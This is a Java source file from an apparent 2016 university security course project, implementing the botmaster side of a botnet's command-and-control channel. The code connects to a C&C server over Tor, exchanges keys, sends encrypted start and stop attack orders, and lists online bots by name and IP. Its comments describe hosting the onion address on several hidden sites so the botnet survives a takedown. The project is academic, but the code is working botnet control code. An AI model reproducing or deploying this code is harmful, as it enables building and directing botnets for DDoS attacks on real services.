/**
 *                     Πανεπιστήμιο Αιγαίου
 *      Τμήμα Μηχανικών Πληροφοριακών & Επικοινωνιακών Συστημάτων
 * 
 *          Ασφάλεια Ασύρματων & Κινητών Δικτύων Επικοινωνιών
 *                     Εαρινό Εξάμηνο 2016
 *                      Project Μαθήματος
 * 
 * Δημιουργία secure botnet με android clients & Dos/DDoS σε DTLS Server.
 * 
 *          Πέππας Κωνσταντίνος 321/2011134 - icsd11134@icsd.aegean.gr
 *          Σωτηρέλης Χρήστος   321/2012182 - icsd12182@icsd.aegean.gr
 *          Χαϊκάλης Νικόλαος   321/2012200 - icsd12200@icsd.aegean.gr
 * 
 *          Καθηγητής Μαθήματος: Γ. Καμπουράκης 
 * 
 */

import botnet.botmasterandroidclient.Attack_Properties;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.security.PrivateKey;
import java.security.PublicKey;
import javax.crypto.SecretKey;
import org.silvertunnel_ng.netlib.api.NetSocket;
import java.util.ArrayList;
import botnet.botmasterandroidclient.*;

/**
 * class pou tin xrisimopoiw gia na ksekinisw ton botmaster kai tin 
 * epikoinwnia tu me ton CnC. I epikoinwnia tou Botmaster kai tou
 * CnC ginetai meso TOR diladi ola ta minimata mesa sto TOR einai kriptografimena
 * alla prin bun sto TOR k me to pu vgun apo to TOR den einai k kapoios pou kanei
 * sniff borei na ta diavasei. Gia to logo auto o CnC server me to pou parei aitima
 * gia connection me ton botmatser dimiourgei ena Zeugari Private & Public keys 
 * stelnei ston botmaster to Public kai o Botmaster me ti seira tu vgazei ena 
 * Secret Key to opoio to kriptografei me to Public Key tou CnC k tou to stelnei.
 * O CnC to apokriptografei me to private kai etsi o Botmaster me ton CnC mirazode
 * to idio Secret Key gia na kriprografun ta minimata prin ta steilun kai na ta 
 * apokriptografun molis lavun kapoio minima.
 */
public class BotMasterCnC_Chat implements Serializable{
    private int port; //port epikoinwnias me ton C&C Server
    private NetSocket socket;
    private ObjectOutputStream oos;
    private ObjectInputStream ois;
    private boolean keepWalking = true; //SYnexizei na milaei me tn CnC
    private PrivateKey Priv;
    private PublicKey Pub;
    private PublicKey CCpub;
    private SecretKey secKey;
    private Chat chating = new Chat();
    private Messages msgs = new Messages();
    private TorConnection tor = new TorConnection();
    private EncryptDecrypt EncDecr = new EncryptDecrypt();
    private ArrayList<Bot_Properties> botList = new ArrayList();
    
     /** 
     * @param port
     * @param CC_IP 
     * Diavazw tis @params apo ton xristi otan thelei na dwsei
     * diaforetiko port.
     */
    public BotMasterCnC_Chat(int port) {
        this.port = port;
    }

    public BotMasterCnC_Chat() {}
    
     /**
     * Methodos pou tin xrisimopoiw gia na edrewsw tin sindesi me ton
     * C&C Server
     */
    public boolean Start_Connection(){
        /**
         * stis parakatw 3 grammes ksekinaw to connection tou
         * botmaster me ton CnC meso tor sto port 4444 to .onion 
         * arxeio anevainei se ena fakelo sto dropbox k apo ekei o
         * CnC to katevazei. Se ena pragmatiko scenario tha anoigame
         * tulaxiston 2 sites sto deep net pu tha ginotan to upload ekei
         * k o CnC tha ta katebaze apo ekei. Tha kaname tulaxiston dyo 
         * gia tin periptwsi pou mas anakalipsun to 1o kai mas to xtipisun 
         * na borume na exume 2i pigi etc.
         */
        tor = new TorConnection(port);
        tor.newOnion();//
        tor.EstablishTorConnection();
        
        oos = tor.getOos();
        ois = tor.getOis();
        HandShake();   
        return true;
    }
    
    /**
     * Method gia na kanw stop to connection me ton CnC.
     */
    public void StopConnection(){
        chating.SendBytes(EncDecr.EncryptWithSecKey((Object) msgs.StopConnection(), secKey));
        keepWalking = false;
        Chat_Thread.interrupt();
        tor.StopConnection();
        System.exit(0);
    }
    
    //Method gia na kanw start to attack.
    public void StartAttack(Attack_Properties msg){
        chating.SendBytes(EncDecr.EncryptWithSecKey((Object) msg, secKey));
    }
    
    //Method gia na kanw Stop to attack.
    public void StopAttack(){
        chating.SendBytes(EncDecr.EncryptWithSecKey((Object) msgs.StopAttack(), secKey));
    }
    
    /**
     * Methodos pou ksekina to HandShake tou Botmaster(server) me ton CnC(client)
     * san handshake exun tin adalagi public key, dimiourgeia Sec Key enrypt tu 
     * Sec key me to Public kai apostoli tou kriptografimenu Sec Key ston CnC
     */
    public void HandShake(){
        chating = new Chat(oos, ois, "BotMaster");//Ksekinaw to chat san botmaster.
        while(keepWalking == true){
            Object readObj = chating.readMessage();//diavazw spam mexri na lavw ena Public Key
            if(readObj instanceof PublicKey){
                CCpub = (PublicKey) readObj;
                secKey = EncDecr.CreateSecretKey();//Dimiourgw to Sec Key
                byte[] encrKey = EncDecr.EncryptSecKeyWithPubKey(secKey, CCpub); //To kriprografw me to Public Key
                chating.SendBytes(encrKey);//Stlenw to kriptografima sto CnC(client)
                //System.out.println("Sec Key: " + secKey + "\nBytes: " + encrKey);
                break;
            }
        }
        Chat_Thread.start();//Thread gia to chat (adalagi minimatwn) tu server-client
    }
    
    private Thread Chat_Thread = new Thread(() -> {
        //stlenw encrypt hello ston client
        byte[] hello = EncDecr.EncryptWithSecKey((Object) msgs.GreetingsServer(), secKey);
        chating.SendBytes(hello);
        /**
         * Oso to keepWalking apo einai true synexizw to diavazw to keepWalking
         * tha ginei false otan o kalestei i StopConnection().
         */
        while(keepWalking == true){
            byte[] readByte = chating.ReadBytes();//diavazw bytes kai an dn einai null ta bytes einai ena minima.
            if(readByte != null){
                readByte = EncDecr.DecryptWithSecKey(readByte, secKey);//Kanw decrypt to minima
                Object readObj = EncDecr.deserialize(readByte);//meatrepw ta decrypted bytes se object
                System.out.println("readObj: " + readObj.toString());//To teliko minima einai auto/
                if(readObj.toString().equalsIgnoreCase(msgs.StopConnection())){//An exw lavei stop kanw stop
                    StopConnection();
                }   
                else if(readObj instanceof ArrayList){//aliws an ehw lavei kapoia ArrayList einai i list me ta online bots.
                    botList = (ArrayList<Bot_Properties>) readObj;
                    if(!botList.isEmpty()){
                        for(int i=0; i<botList.size(); i++){
                            System.out.println(botList.get(i).getBotPCname());
                            System.out.println(botList.get(i).getBotIP());
                            System.out.println(botList.get(i).getOos());
                        }
                    }
                }
            }
            //StopConnection();
        }
    });
    
    // Gets & Sets: 
    
    public PublicKey getPub() {
        return Pub;
    }

    public void setPub(PublicKey Pub) {
        this.Pub = Pub;
    }

    public PublicKey getCCpub() {
        return CCpub;
    }

    public void setCCpub(PublicKey CCpub) {
        this.CCpub = CCpub;
    }

    public SecretKey getSecKey() {
        return secKey;
    }

    public void setSecKey(SecretKey secKey) {
        this.secKey = secKey;
    }

    public EncryptDecrypt getEncDecr() {
        return EncDecr;
    }

    public void setEncDecr(EncryptDecrypt EncDecr) {
        this.EncDecr = EncDecr;
    }

    public ArrayList<Bot_Properties> getBotList() {
        return botList;
    }

    //Setters Getters:
    public void setBotList(ArrayList<Bot_Properties> botList) {    
        this.botList = botList;
    }

    public int getPort() {
        return port;
    }

    public void setPort(int port) {
        this.port = port;
    }

    public NetSocket getSocket() {
        return socket;
    }

    public void setSocket(NetSocket socket) {
        this.socket = socket;
    }

    public ObjectOutputStream getOos() {
        return oos;
    }

    public void setOos(ObjectOutputStream oos) {
        this.oos = oos;
    }

    public ObjectInputStream getOis() {
        return ois;
    }

    public void setOis(ObjectInputStream ois) {
        this.ois = ois;
    }

    public boolean isKeepWalking() {
        return keepWalking;
    }

    public void setKeepWalking(boolean keepWalking) {
        this.keepWalking = keepWalking;
    }

    public PrivateKey getPriv() {
        return Priv;
    }

    public void setPriv(PrivateKey Priv) {
        this.Priv = Priv;
    }

    public Chat getChating() {
        return chating;
    }

    public void setChating(Chat chating) {
        this.chating = chating;
    }

    public Messages getMsgs() {
        return msgs;
    }

    public void setMsgs(Messages msgs) {
        this.msgs = msgs;
    }

    public TorConnection getTor() {
        return tor;
    }

    public void setTor(TorConnection tor) {
        this.tor = tor;
    }

    public Thread getChat_Thread() {
        return Chat_Thread;
    }

    public void setChat_Thread(Thread Chat_Thread) {
        this.Chat_Thread = Chat_Thread;
    }
    
    
    
}
